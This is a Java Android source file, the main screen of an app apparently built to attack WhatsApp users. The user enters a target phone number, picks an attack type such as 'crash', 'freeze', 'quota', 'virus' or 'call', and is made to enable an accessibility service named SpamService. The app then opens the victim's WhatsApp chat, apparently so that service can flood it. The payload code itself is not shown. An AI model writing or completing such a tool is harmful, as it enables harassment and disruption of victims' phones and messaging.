package com.kaze.bugwa;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.Toast;

public class MainActivity extends Activity {
    public static boolean isRunning = false;
    public static String targetNum = "";
    public static String senderNum = "";
    public static String bugType = "crash";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // LOAD BANNER
        ImageView banner = findViewById(R.id.bannerImage);
        int bannerResId = getResources().getIdentifier("bannerbug", "drawable", getPackageName());
        if (bannerResId != 0) banner.setImageResource(bannerResId);

        final EditText etTarget = findViewById(R.id.targetNum);
        Button btnStart = findViewById(R.id.btnStart);
        
        LinearLayout bugCrash = findViewById(R.id.bugCrash);
        LinearLayout bugDelay = findViewById(R.id.bugDelay);
        LinearLayout bugFreeze = findViewById(R.id.bugFreeze);
        LinearLayout bugQuota = findViewById(R.id.bugQuota);
        LinearLayout bugVirus = findViewById(R.id.bugVirus);
        LinearLayout bugCall = findViewById(R.id.bugCall);

        bugCrash.setOnClickListener(v -> selectBug("crash", bugCrash));
        bugDelay.setOnClickListener(v -> selectBug("delay", bugDelay));
        bugFreeze.setOnClickListener(v -> selectBug("freeze", bugFreeze));
        bugQuota.setOnClickListener(v -> selectBug("quota", bugQuota));
        bugVirus.setOnClickListener(v -> selectBug("virus", bugVirus));
        bugCall.setOnClickListener(v -> selectBug("call", bugCall));

        findViewById(R.id.btnTutorial).setOnClickListener(v -> showTutorial());

        btnStart.setOnClickListener(v -> {
            targetNum = etTarget.getText().toString().trim();
            if(targetNum.startsWith("0")) targetNum = "62" + targetNum.substring(1);
            if(targetNum.isEmpty()) { Toast.makeText(this, "Isi nomor target!", Toast.LENGTH_SHORT).show(); return; }
            
            if(!isAccessibilityEnabled()) {
                Toast.makeText(this, "Aktifkan Aksesibilitas!", Toast.LENGTH_LONG).show();
                startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
            } else {
                launchWA();
            }
        });
    }

    private void selectBug(String type, LinearLayout btn) {
        bugType = type;
        LinearLayout[] btns = {findViewById(R.id.bugCrash), findViewById(R.id.bugDelay), findViewById(R.id.bugFreeze), findViewById(R.id.bugQuota), findViewById(R.id.bugVirus), findViewById(R.id.bugCall)};
        for(LinearLayout b : btns) b.setBackgroundResource(R.drawable.bg_bug_inactive);
        btn.setBackgroundResource(R.drawable.bg_bug_active);
    }

    private void showTutorial() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        View v = getLayoutInflater().inflate(R.layout.dialog_tutorial, null);
        builder.setView(v);
        AlertDialog d = builder.create();
        if(d.getWindow() != null) d.getWindow().setBackgroundDrawableResource(android.R.color.transparent);
        v.findViewById(R.id.btnTutupTutorial).setOnClickListener(x -> d.dismiss());
        d.show();
    }

    private void launchWA() {
        isRunning = true;
        Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse("https://wa.me/" + targetNum));
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(i);
    }

    private boolean isAccessibilityEnabled() {
        String service = getPackageName() + "/" + SpamService.class.getCanonicalName();
        try {
            String enabled = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            return enabled != null && enabled.contains(service);
        } catch (Exception e) { return false; }
    }
}
